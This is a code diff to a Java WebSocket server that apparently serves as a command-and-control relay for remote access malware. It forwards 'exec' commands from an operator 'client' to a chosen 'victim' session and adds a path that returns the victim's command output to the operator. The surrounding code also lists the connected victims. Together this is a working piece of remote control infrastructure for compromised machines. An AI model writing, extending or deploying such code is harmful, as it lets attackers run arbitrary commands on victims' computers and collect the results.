@@ -73,10 +73,13 @@ public class WebSocketServer {
                     send(session,commands.lv(victims));
                 }
             } else if (type.equals("exec")) {
-                logger.info("execute command"+" client:"+jsonNode.get("client")+" victim:"+jsonNode.get("victim")+" command:"+jsonNode.get("command"));
                 if(jsonNode.get("state").asText().equals("req")){
                     logger.info("req came");
+                    logger.info("execute command"+" client:"+jsonNode.get("client")+" victim:"+jsonNode.get("victim")+" command:"+jsonNode.get("command"));
                     sendMessageToVictim(jsonNode.get("victim").asText(),commands.sendVictimExec(jsonNode.get("client").asText(),jsonNode.get("command").asText()));
+                }else{
+                    logger.info("res came "+jsonNode.get("data").isArray());
+                    sendMessageToClient(jsonNode.get("client_id").asText(),commands.sendClientExec(jsonNode.get("command").asText(), String.valueOf(jsonNode.get("data"))));
                 }
             }
 
@@ -118,6 +121,21 @@ public class WebSocketServer {
         }
     }
 
+    public void sendMessageToClient(String sessionId, String message) {
+        try {
+            for (Session client : clients) {
+                if (client.getId().equals(sessionId)) {
+                    client.getBasicRemote().sendText(message);
+                    logger.info("Message sent to client with sessionId: " + sessionId);
+                    return; // Exit once the message is sent
+                }
+            }
+            logger.warning("No client found with sessionId: " + sessionId);
+        } catch (IOException e) {
+            logger.severe("Error sending message to client with sessionId: " + sessionId);
+            e.printStackTrace();
+        }
+    }
 
 }
 
